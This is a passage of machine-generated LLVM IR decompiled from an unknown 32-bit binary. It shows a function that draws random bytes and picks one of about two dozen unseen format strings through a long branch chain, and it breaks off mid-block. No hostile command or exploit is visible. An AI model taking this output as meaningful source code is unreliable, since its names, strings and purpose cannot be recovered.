  %v3_8049ef8 = phi i32 [ %arg4, %dec_label_pc_8049ef8.lr.ph ], [ %v3_8049ef8.pre, %dec_label_pc_8049eed.backedge.dec_label_pc_8049ef8_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049ef8.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049eed.backedge.dec_label_pc_8049ef8_crit_edge ]
  %tmp30 = icmp slt i32 %v3_8049ef8, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_8049d88, label %dec_label_pc_8049f06

dec_label_pc_8049f06:                             ; preds = %dec_label_pc_8049ef8
  br i1 %tmp33, label %dec_label_pc_8049d88, label %dec_label_pc_8049f14

dec_label_pc_8049f14:                             ; preds = %dec_label_pc_8049d88, %dec_label_pc_8049f06, %dec_label_pc_8049eed.backedge, %dec_label_pc_8049ed5, %dec_label_pc_8049eb9, %dec_label_pc_8049d4c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_8049d4c ], [ 1, %dec_label_pc_8049eb9 ], [ 1, %dec_label_pc_8049ed5 ], [ 0, %dec_label_pc_8049eed.backedge ], [ 0, %dec_label_pc_8049f06 ], [ 0, %dec_label_pc_8049d88 ]
  br label %dec_label_pc_8049f30

dec_label_pc_8049f30:                             ; preds = %dec_label_pc_8049e89, %dec_label_pc_8049e48, %dec_label_pc_8049e74, %dec_label_pc_8049def, %dec_label_pc_8049e23, %dec_label_pc_8049f14
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049f14 ], [ 0, %dec_label_pc_8049e23 ], [ 0, %dec_label_pc_8049def ], [ 0, %dec_label_pc_8049e74 ], [ 0, %dec_label_pc_8049e48 ], [ 0, %dec_label_pc_8049e89 ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049e66, { 1, 2, 0 }
  uselistorder i32 %v4_8049e15, { 1, 2, 0 }
  uselistorder i32 %v5_8049df2, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049f30, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049f14, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049eed.backedge, { 2, 1, 0 }
}

define i32 @function_8049f3f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8049f3f:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049f42 = load i32, i32* @ebx, align 4
  store i32 %v0_8049f42, i32* %stack_var_-8, align 4
  store i8 0, i8* bitcast (i32* @global_var_805e8d7.39 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_805e8d8.40 to i8*), align 8
  store i8 0, i8* @global_var_805e8d9.41, align 1
  store i8 0, i8* @global_var_805e8da.42, align 2
  %v1_8049f62 = call i32 @function_8053664(i32 %v0_8049f42)
  %v2_8049f84 = sdiv i32 %v1_8049f62, 51
  store i32 %v2_8049f84, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049f84, -255
  %v2_8049f94 = add i32 %v1_8049f62, %tmp
  %v14_8049f94 = trunc i32 %v2_8049f94 to i8
  store i32 %v2_8049f94, i32* @eax, align 4
  store i8 %v14_8049f94, i8* bitcast (i32* @global_var_805e8d7.39 to i8*), align 4
  %v1_8049fa2 = call i32 @function_8053664(i32 -2139062143)
  %v2_8049fc4 = sdiv i32 %v1_8049fa2, 51
  store i32 %v2_8049fc4, i32* @ebx, align 4
  %tmp21 = mul i32 %v2_8049fc4, -255
  %v2_8049fd4 = add i32 %v1_8049fa2, %tmp21
  %v14_8049fd4 = trunc i32 %v2_8049fd4 to i8
  store i32 %v2_8049fd4, i32* @eax, align 4
  store i8 %v14_8049fd4, i8* bitcast (i32* @global_var_805e8d8.40 to i8*), align 8
  %v1_8049fe2 = call i32 @function_8053664(i32 -2139062143)
  %v2_804a004 = sdiv i32 %v1_8049fe2, 51
  store i32 %v2_804a004, i32* @ebx, align 4
  %tmp22 = mul i32 %v2_804a004, -255
  %v2_804a014 = add i32 %v1_8049fe2, %tmp22
  %v14_804a014 = trunc i32 %v2_804a014 to i8
  store i32 %v2_804a014, i32* @eax, align 4
  store i8 %v14_804a014, i8* @global_var_805e8d9.41, align 1
  %v1_804a022 = call i32 @function_8053664(i32 -2139062143)
  %v2_804a044 = sdiv i32 %v1_804a022, 51
  store i32 %v2_804a044, i32* @ebx, align 4
  %tmp23 = mul i32 %v2_804a044, -255
  %v2_804a054 = add i32 %v1_804a022, %tmp23
  %v14_804a054 = trunc i32 %v2_804a054 to i8
  store i32 %v2_804a054, i32* @eax, align 4
  store i8 %v14_804a054, i8* @global_var_805e8da.42, align 2
  %v1_804a062 = call i32 @function_8053664(i32 -2139062143)
  %v2_804a084 = sdiv i32 %v1_804a062, 50
  %tmp20 = mul i32 %v2_804a084, -247
  %v2_804a0a2 = add i32 %tmp20, %v1_804a062
  %v12_804a0a2 = icmp eq i32 %v2_804a0a2, 0
  store i32 %v2_804a0a2, i32* @edx, align 4
  %v1_804a0ad = icmp eq i1 %v12_804a0a2, false
  br i1 %v1_804a0ad, label %dec_label_pc_804a0df, label %dec_label_pc_804a0af

dec_label_pc_804a0af:                             ; preds = %dec_label_pc_8049f3f
  %v0_804a0af = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a0af = zext i8 %v0_804a0af to i32
  store i32 %v1_804a0af, i32* @edx, align 4
  %v0_804a0b9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a0b9 = zext i8 %v0_804a0b9 to i32
  %v2_804a0c8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0c8, i32* @ebx, align 4
  %v5_804a0da = call i32 @function_8048c55(i32 %v2_804a0c8, i32 ptrtoint ([11 x i8]* @global_var_805a9f1.43 to i32), i32 %v1_804a0b9, i32 %v1_804a0af)
  br label %dec_label_pc_804a0df

dec_label_pc_804a0df:                             ; preds = %dec_label_pc_8049f3f, %dec_label_pc_804a0af
  %v13_804a0df = icmp eq i32 %v2_804a0a2, 1
  %v1_804a0e3 = icmp eq i1 %v13_804a0df, false
  br i1 %v1_804a0e3, label %dec_label_pc_804a115, label %dec_label_pc_804a0e5

dec_label_pc_804a0e5:                             ; preds = %dec_label_pc_804a0df
  %v0_804a0e5 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a0e5 = zext i8 %v0_804a0e5 to i32
  store i32 %v1_804a0e5, i32* @edx, align 4
  %v0_804a0ef = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a0ef = zext i8 %v0_804a0ef to i32
  %v2_804a0fe = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0fe, i32* @ebx, align 4
  %v5_804a110 = call i32 @function_8048c55(i32 %v2_804a0fe, i32 ptrtoint ([12 x i8]* @global_var_805a9fc.44 to i32), i32 %v1_804a0ef, i32 %v1_804a0e5)
  br label %dec_label_pc_804a115

dec_label_pc_804a115:                             ; preds = %dec_label_pc_804a0df, %dec_label_pc_804a0e5
  %v13_804a115 = icmp eq i32 %v2_804a0a2, 2
  %v1_804a119 = icmp eq i1 %v13_804a115, false
  br i1 %v1_804a119, label %dec_label_pc_804a14b, label %dec_label_pc_804a11b

dec_label_pc_804a11b:                             ; preds = %dec_label_pc_804a115
  %v0_804a11b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a11b = zext i8 %v0_804a11b to i32
  store i32 %v1_804a11b, i32* @edx, align 4
  %v0_804a125 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a125 = zext i8 %v0_804a125 to i32
  %v2_804a134 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a134, i32* @ebx, align 4
  %v5_804a146 = call i32 @function_8048c55(i32 %v2_804a134, i32 ptrtoint ([12 x i8]* @global_var_805aa08.45 to i32), i32 %v1_804a125, i32 %v1_804a11b)
  br label %dec_label_pc_804a14b

dec_label_pc_804a14b:                             ; preds = %dec_label_pc_804a115, %dec_label_pc_804a11b
  %v13_804a14b = icmp eq i32 %v2_804a0a2, 3
  %v1_804a14f = icmp eq i1 %v13_804a14b, false
  br i1 %v1_804a14f, label %dec_label_pc_804a181, label %dec_label_pc_804a151

dec_label_pc_804a151:                             ; preds = %dec_label_pc_804a14b
  %v0_804a151 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a151 = zext i8 %v0_804a151 to i32
  store i32 %v1_804a151, i32* @edx, align 4
  %v0_804a15b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a15b = zext i8 %v0_804a15b to i32
  %v2_804a16a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a16a, i32* @ebx, align 4
  %v5_804a17c = call i32 @function_8048c55(i32 %v2_804a16a, i32 ptrtoint ([12 x i8]* @global_var_805aa14.46 to i32), i32 %v1_804a15b, i32 %v1_804a151)
  br label %dec_label_pc_804a181

dec_label_pc_804a181:                             ; preds = %dec_label_pc_804a14b, %dec_label_pc_804a151
  %v13_804a181 = icmp eq i32 %v2_804a0a2, 4
  %v1_804a185 = icmp eq i1 %v13_804a181, false
  br i1 %v1_804a185, label %dec_label_pc_804a1b7, label %dec_label_pc_804a187

dec_label_pc_804a187:                             ; preds = %dec_label_pc_804a181
  %v0_804a187 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a187 = zext i8 %v0_804a187 to i32
  store i32 %v1_804a187, i32* @edx, align 4
  %v0_804a191 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a191 = zext i8 %v0_804a191 to i32
  %v2_804a1a0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1a0, i32* @ebx, align 4
  %v5_804a1b2 = call i32 @function_8048c55(i32 %v2_804a1a0, i32 ptrtoint ([12 x i8]* @global_var_805aa20.47 to i32), i32 %v1_804a191, i32 %v1_804a187)
  br label %dec_label_pc_804a1b7

dec_label_pc_804a1b7:                             ; preds = %dec_label_pc_804a181, %dec_label_pc_804a187
  %v13_804a1b7 = icmp eq i32 %v2_804a0a2, 5
  %v1_804a1bb = icmp eq i1 %v13_804a1b7, false
  br i1 %v1_804a1bb, label %dec_label_pc_804a1ed, label %dec_label_pc_804a1bd

dec_label_pc_804a1bd:                             ; preds = %dec_label_pc_804a1b7
  %v0_804a1bd = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a1bd = zext i8 %v0_804a1bd to i32
  store i32 %v1_804a1bd, i32* @edx, align 4
  %v0_804a1c7 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a1c7 = zext i8 %v0_804a1c7 to i32
  %v2_804a1d6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1d6, i32* @ebx, align 4
  %v5_804a1e8 = call i32 @function_8048c55(i32 %v2_804a1d6, i32 ptrtoint ([12 x i8]* @global_var_805aa2c.48 to i32), i32 %v1_804a1c7, i32 %v1_804a1bd)
  br label %dec_label_pc_804a1ed

dec_label_pc_804a1ed:                             ; preds = %dec_label_pc_804a1b7, %dec_label_pc_804a1bd
  %v13_804a1ed = icmp eq i32 %v2_804a0a2, 6
  %v1_804a1f1 = icmp eq i1 %v13_804a1ed, false
  br i1 %v1_804a1f1, label %dec_label_pc_804a223, label %dec_label_pc_804a1f3

dec_label_pc_804a1f3:                             ; preds = %dec_label_pc_804a1ed
  %v0_804a1f3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a1f3 = zext i8 %v0_804a1f3 to i32
  store i32 %v1_804a1f3, i32* @edx, align 4
  %v0_804a1fd = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a1fd = zext i8 %v0_804a1fd to i32
  %v2_804a20c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a20c, i32* @ebx, align 4
  %v5_804a21e = call i32 @function_8048c55(i32 %v2_804a20c, i32 ptrtoint ([13 x i8]* @global_var_805aa38.49 to i32), i32 %v1_804a1fd, i32 %v1_804a1f3)
  br label %dec_label_pc_804a223

dec_label_pc_804a223:                             ; preds = %dec_label_pc_804a1ed, %dec_label_pc_804a1f3
  %v13_804a223 = icmp eq i32 %v2_804a0a2, 7
  %v1_804a227 = icmp eq i1 %v13_804a223, false
  br i1 %v1_804a227, label %dec_label_pc_804a259, label %dec_label_pc_804a229

dec_label_pc_804a229:                             ; preds = %dec_label_pc_804a223
  %v0_804a229 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a229 = zext i8 %v0_804a229 to i32
  store i32 %v1_804a229, i32* @edx, align 4
  %v0_804a233 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a233 = zext i8 %v0_804a233 to i32
  %v2_804a242 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a242, i32* @ebx, align 4
  %v5_804a254 = call i32 @function_8048c55(i32 %v2_804a242, i32 ptrtoint ([13 x i8]* @global_var_805aa45.50 to i32), i32 %v1_804a233, i32 %v1_804a229)
  br label %dec_label_pc_804a259

dec_label_pc_804a259:                             ; preds = %dec_label_pc_804a223, %dec_label_pc_804a229
  %v13_804a259 = icmp eq i32 %v2_804a0a2, 8
  %v1_804a25d = icmp eq i1 %v13_804a259, false
  br i1 %v1_804a25d, label %dec_label_pc_804a28f, label %dec_label_pc_804a25f

dec_label_pc_804a25f:                             ; preds = %dec_label_pc_804a259
  %v0_804a25f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a25f = zext i8 %v0_804a25f to i32
  store i32 %v1_804a25f, i32* @edx, align 4
  %v0_804a269 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a269 = zext i8 %v0_804a269 to i32
  %v2_804a278 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a278, i32* @ebx, align 4
  %v5_804a28a = call i32 @function_8048c55(i32 %v2_804a278, i32 ptrtoint ([13 x i8]* @global_var_805aa52.51 to i32), i32 %v1_804a269, i32 %v1_804a25f)
  br label %dec_label_pc_804a28f

dec_label_pc_804a28f:                             ; preds = %dec_label_pc_804a259, %dec_label_pc_804a25f
  %v13_804a28f = icmp eq i32 %v2_804a0a2, 9
  %v1_804a293 = icmp eq i1 %v13_804a28f, false
  br i1 %v1_804a293, label %dec_label_pc_804a2c5, label %dec_label_pc_804a295

dec_label_pc_804a295:                             ; preds = %dec_label_pc_804a28f
  %v0_804a295 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a295 = zext i8 %v0_804a295 to i32
  store i32 %v1_804a295, i32* @edx, align 4
  %v0_804a29f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a29f = zext i8 %v0_804a29f to i32
  %v2_804a2ae = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2ae, i32* @ebx, align 4
  %v5_804a2c0 = call i32 @function_8048c55(i32 %v2_804a2ae, i32 ptrtoint ([13 x i8]* @global_var_805aa5f.52 to i32), i32 %v1_804a29f, i32 %v1_804a295)
  br label %dec_label_pc_804a2c5

dec_label_pc_804a2c5:                             ; preds = %dec_label_pc_804a28f, %dec_label_pc_804a295
  %v13_804a2c5 = icmp eq i32 %v2_804a0a2, 10
  %v1_804a2c9 = icmp eq i1 %v13_804a2c5, false
  br i1 %v1_804a2c9, label %dec_label_pc_804a2fb, label %dec_label_pc_804a2cb

dec_label_pc_804a2cb:                             ; preds = %dec_label_pc_804a2c5
  %v0_804a2cb = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a2cb = zext i8 %v0_804a2cb to i32
  store i32 %v1_804a2cb, i32* @edx, align 4
  %v0_804a2d5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a2d5 = zext i8 %v0_804a2d5 to i32
  %v2_804a2e4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2e4, i32* @ebx, align 4
  %v5_804a2f6 = call i32 @function_8048c55(i32 %v2_804a2e4, i32 ptrtoint ([13 x i8]* @global_var_805aa6c.53 to i32), i32 %v1_804a2d5, i32 %v1_804a2cb)
  br label %dec_label_pc_804a2fb

dec_label_pc_804a2fb:                             ; preds = %dec_label_pc_804a2c5, %dec_label_pc_804a2cb
  %v13_804a2fb = icmp eq i32 %v2_804a0a2, 11
  %v1_804a2ff = icmp eq i1 %v13_804a2fb, false
  br i1 %v1_804a2ff, label %dec_label_pc_804a331, label %dec_label_pc_804a301

dec_label_pc_804a301:                             ; preds = %dec_label_pc_804a2fb
  %v0_804a301 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a301 = zext i8 %v0_804a301 to i32
  store i32 %v1_804a301, i32* @edx, align 4
  %v0_804a30b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a30b = zext i8 %v0_804a30b to i32
  %v2_804a31a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a31a, i32* @ebx, align 4
  %v5_804a32c = call i32 @function_8048c55(i32 %v2_804a31a, i32 ptrtoint ([13 x i8]* @global_var_805aa79.54 to i32), i32 %v1_804a30b, i32 %v1_804a301)
  br label %dec_label_pc_804a331

dec_label_pc_804a331:                             ; preds = %dec_label_pc_804a2fb, %dec_label_pc_804a301
  %v13_804a331 = icmp eq i32 %v2_804a0a2, 12
  %v1_804a335 = icmp eq i1 %v13_804a331, false
  br i1 %v1_804a335, label %dec_label_pc_804a367, label %dec_label_pc_804a337

dec_label_pc_804a337:                             ; preds = %dec_label_pc_804a331
  %v0_804a337 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a337 = zext i8 %v0_804a337 to i32
  store i32 %v1_804a337, i32* @edx, align 4
  %v0_804a341 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a341 = zext i8 %v0_804a341 to i32
  %v2_804a350 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a350, i32* @ebx, align 4
  %v5_804a362 = call i32 @function_8048c55(i32 %v2_804a350, i32 ptrtoint ([13 x i8]* @global_var_805aa86.55 to i32), i32 %v1_804a341, i32 %v1_804a337)
  br label %dec_label_pc_804a367

dec_label_pc_804a367:                             ; preds = %dec_label_pc_804a331, %dec_label_pc_804a337
  %v13_804a367 = icmp eq i32 %v2_804a0a2, 13
  %v1_804a36b = icmp eq i1 %v13_804a367, false
  br i1 %v1_804a36b, label %dec_label_pc_804a39d, label %dec_label_pc_804a36d

dec_label_pc_804a36d:                             ; preds = %dec_label_pc_804a367
  %v0_804a36d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a36d = zext i8 %v0_804a36d to i32
  store i32 %v1_804a36d, i32* @edx, align 4
  %v0_804a377 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a377 = zext i8 %v0_804a377 to i32
  %v2_804a386 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a386, i32* @ebx, align 4
  %v5_804a398 = call i32 @function_8048c55(i32 %v2_804a386, i32 ptrtoint ([13 x i8]* @global_var_805aa93.56 to i32), i32 %v1_804a377, i32 %v1_804a36d)
  br label %dec_label_pc_804a39d

dec_label_pc_804a39d:                             ; preds = %dec_label_pc_804a367, %dec_label_pc_804a36d
  %v13_804a39d = icmp eq i32 %v2_804a0a2, 14
  %v1_804a3a1 = icmp eq i1 %v13_804a39d, false
  br i1 %v1_804a3a1, label %dec_label_pc_804a3d3, label %dec_label_pc_804a3a3

dec_label_pc_804a3a3:                             ; preds = %dec_label_pc_804a39d
  %v0_804a3a3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a3a3 = zext i8 %v0_804a3a3 to i32
  store i32 %v1_804a3a3, i32* @edx, align 4
  %v0_804a3ad = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a3ad = zext i8 %v0_804a3ad to i32
  %v2_804a3bc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3bc, i32* @ebx, align 4
  %v5_804a3ce = call i32 @function_8048c55(i32 %v2_804a3bc, i32 ptrtoint ([12 x i8]* @global_var_805aaa0.57 to i32), i32 %v1_804a3ad, i32 %v1_804a3a3)
  br label %dec_label_pc_804a3d3

dec_label_pc_804a3d3:                             ; preds = %dec_label_pc_804a39d, %dec_label_pc_804a3a3
  %v13_804a3d3 = icmp eq i32 %v2_804a0a2, 15
  %v1_804a3d7 = icmp eq i1 %v13_804a3d3, false
  br i1 %v1_804a3d7, label %dec_label_pc_804a409, label %dec_label_pc_804a3d9

dec_label_pc_804a3d9:                             ; preds = %dec_label_pc_804a3d3
  %v0_804a3d9 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a3d9 = zext i8 %v0_804a3d9 to i32
  store i32 %v1_804a3d9, i32* @edx, align 4
  %v0_804a3e3 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a3e3 = zext i8 %v0_804a3e3 to i32
  %v2_804a3f2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3f2, i32* @ebx, align 4
  %v5_804a404 = call i32 @function_8048c55(i32 %v2_804a3f2, i32 ptrtoint ([12 x i8]* @global_var_805aaac.58 to i32), i32 %v1_804a3e3, i32 %v1_804a3d9)
  br label %dec_label_pc_804a409

dec_label_pc_804a409:                             ; preds = %dec_label_pc_804a3d3, %dec_label_pc_804a3d9
  %v10_804a409 = icmp eq i32 %v2_804a0a2, 16
  %v1_804a40d = icmp eq i1 %v10_804a409, false
  br i1 %v1_804a40d, label %dec_label_pc_804a43f, label %dec_label_pc_804a40f

dec_label_pc_804a40f:                             ; preds = %dec_label_pc_804a409
  %v0_804a40f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a40f = zext i8 %v0_804a40f to i32
  store i32 %v1_804a40f, i32* @edx, align 4
  %v0_804a419 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a419 = zext i8 %v0_804a419 to i32
  %v2_804a428 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a428, i32* @ebx, align 4
  %v5_804a43a = call i32 @function_8048c55(i32 %v2_804a428, i32 ptrtoint ([13 x i8]* @global_var_805aab8.59 to i32), i32 %v1_804a419, i32 %v1_804a40f)
  br label %dec_label_pc_804a43f

dec_label_pc_804a43f:                             ; preds = %dec_label_pc_804a409, %dec_label_pc_804a40f
  %v13_804a43f = icmp eq i32 %v2_804a0a2, 17
  %v1_804a443 = icmp eq i1 %v13_804a43f, false
  br i1 %v1_804a443, label %dec_label_pc_804a475, label %dec_label_pc_804a445

dec_label_pc_804a445:                             ; preds = %dec_label_pc_804a43f
  %v0_804a445 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a445 = zext i8 %v0_804a445 to i32
  store i32 %v1_804a445, i32* @edx, align 4
  %v0_804a44f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a44f = zext i8 %v0_804a44f to i32
  %v2_804a45e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a45e, i32* @ebx, align 4
  %v5_804a470 = call i32 @function_8048c55(i32 %v2_804a45e, i32 ptrtoint ([13 x i8]* @global_var_805aac5.60 to i32), i32 %v1_804a44f, i32 %v1_804a445)
  br label %dec_label_pc_804a475

dec_label_pc_804a475:                             ; preds = %dec_label_pc_804a43f, %dec_label_pc_804a445
  %v13_804a475 = icmp eq i32 %v2_804a0a2, 18
  %v1_804a479 = icmp eq i1 %v13_804a475, false
  br i1 %v1_804a479, label %dec_label_pc_804a4ab, label %dec_label_pc_804a47b

dec_label_pc_804a47b:                             ; preds = %dec_label_pc_804a475
  %v0_804a47b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a47b = zext i8 %v0_804a47b to i32
  store i32 %v1_804a47b, i32* @edx, align 4
  %v0_804a485 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a485 = zext i8 %v0_804a485 to i32
  %v2_804a494 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a494, i32* @ebx, align 4
  %v5_804a4a6 = call i32 @function_8048c55(i32 %v2_804a494, i32 ptrtoint ([13 x i8]* @global_var_805aad2.61 to i32), i32 %v1_804a485, i32 %v1_804a47b)
  br label %dec_label_pc_804a4ab

dec_label_pc_804a4ab:                             ; preds = %dec_label_pc_804a475, %dec_label_pc_804a47b
  %v13_804a4ab = icmp eq i32 %v2_804a0a2, 19
  %v1_804a4af = icmp eq i1 %v13_804a4ab, false
  br i1 %v1_804a4af, label %dec_label_pc_804a4e1, label %dec_label_pc_804a4b1

dec_label_pc_804a4b1:                             ; preds = %dec_label_pc_804a4ab
  %v0_804a4b1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a4b1 = zext i8 %v0_804a4b1 to i32
  store i32 %v1_804a4b1, i32* @edx, align 4
  %v0_804a4bb = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a4bb = zext i8 %v0_804a4bb to i32
  %v2_804a4ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4ca, i32* @ebx, align 4
  %v5_804a4dc = call i32 @function_8048c55(i32 %v2_804a4ca, i32 ptrtoint ([12 x i8]* @global_var_805aadf.62 to i32), i32 %v1_804a4bb, i32 %v1_804a4b1)
  br label %dec_label_pc_804a4e1

dec_label_pc_804a4e1:                             ; preds = %dec_label_pc_804a4ab, %dec_label_pc_804a4b1
  %v13_804a4e1 = icmp eq i32 %v2_804a0a2, 20
  %v1_804a4e5 = icmp eq i1 %v13_804a4e1, false
  br i1 %v1_804a4e5, label %dec_label_pc_804a517, label %dec_label_pc_804a4e7

dec_label_pc_804a4e7:                             ; preds = %dec_label_pc_804a4e1
  %v0_804a4e7 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a4e7 = zext i8 %v0_804a4e7 to i32
  store i32 %v1_804a4e7, i32* @edx, align 4
  %v0_804a4f1 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a4f1 = zext i8 %v0_804a4f1 to i32
  %v2_804a500 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a500, i32* @ebx, align 4
  %v5_804a512 = call i32 @function_8048c55(i32 %v2_804a500, i32 ptrtoint ([12 x i8]* @global_var_805aaeb.63 to i32), i32 %v1_804a4f1, i32 %v1_804a4e7)
  br label %dec_label_pc_804a517

dec_label_pc_804a517:                             ; preds = %dec_label_pc_804a4e1, %dec_label_pc_804a4e7
  %v13_804a517 = icmp eq i32 %v2_804a0a2, 21
  %v1_804a51b = icmp eq i1 %v13_804a517, false
  br i1 %v1_804a51b, label %dec_label_pc_804a54d, label %dec_label_pc_804a51d

dec_label_pc_804a51d:                             ; preds = %dec_label_pc_804a517
  %v0_804a51d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a51d = zext i8 %v0_804a51d to i32
  store i32 %v1_804a51d, i32* @edx, align 4
  %v0_804a527 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a527 = zext i8 %v0_804a527 to i32
  %v2_804a536 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a536, i32* @ebx, align 4
  %v5_804a548 = call i32 @function_8048c55(i32 %v2_804a536, i32 ptrtoint ([13 x i8]* @global_var_805aaf7.64 to i32), i32 %v1_804a527, i32 %v1_804a51d)
  br label %dec_label_pc_804a54d

dec_label_pc_804a54d:                             ; preds = %dec_label_pc_804a517, %dec_label_pc_804a51d
  %v13_804a54d = icmp eq i32 %v2_804a0a2, 22
  %v1_804a551 = icmp eq i1 %v13_804a54d, false
  br i1 %v1_804a551, label %dec_label_pc_804a583, label %dec_label_pc_804a553

dec_label_pc_804a553:                             ; preds = %dec_label_pc_804a54d
  %v0_804a553 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a553 = zext i8 %v0_804a553 to i32
  store i32 %v1_804a553, i32* @edx, align 4
  %v0_804a55d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a55d = zext i8 %v0_804a55d to i32
  %v2_804a56c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a56c, i32* @ebx, align 4
  %v5_804a57e = call i32 @function_8048c55(i32 %v2_804a56c, i32 ptrtoint ([12 x i8]* @global_var_805ab04.65 to i32), i32 %v1_804a55d, i32 %v1_804a553)
  br label %dec_label_pc_804a583

dec_label_pc_804a583:                             ; preds = %dec_label_pc_804a54d, %dec_label_pc_804a553
  %v13_804a583 = icmp eq i32 %v2_804a0a2, 23
  %v1_804a587 = icmp eq i1 %v13_804a583, false
  br i1 %v1_804a587, label %dec_label_pc_804a5b9, label %dec_label_pc_804a589

dec_label_pc_804a589:                             ; preds = %dec_label_pc_804a583
  %v0_804a589 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a589 = zext i8 %v0_804a589 to i32
  store i32 %v1_804a589, i32* @edx, align 4
  %v0_804a593 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a593 = zext i8 %v0_804a593 to i32
  %v2_804a5a2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5a2, i32* @ebx, align 4
  %v5_804a5b4 = call i32 @function_8048c55(i32 %v2_804a5a2, i32 ptrtoint ([14 x i8]* @global_var_805ab10.66 to i32), i32 %v1_804a593, i32 %v1_804a589)
  br label %dec_label_pc_804a5b9

dec_label_pc_804a5b9:                             ; preds = %dec_label_pc_804a583, %dec_label_pc_804a589
  %v13_804a5b9 = icmp eq i32 %v2_804a0a2, 24
  %v1_804a5bd = icmp eq i1 %v13_804a5b9, false
  br i1 %v1_804a5bd, label %dec_label_pc_804a5ef, label %dec_label_pc_804a5bf

dec_label_pc_804a5bf:                             ; preds = %dec_label_pc_804a5b9
  %v0_804a5bf = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a5bf = zext i8 %v0_804a5bf to i32
  store i32 %v1_804a5bf, i32* @edx, align 4
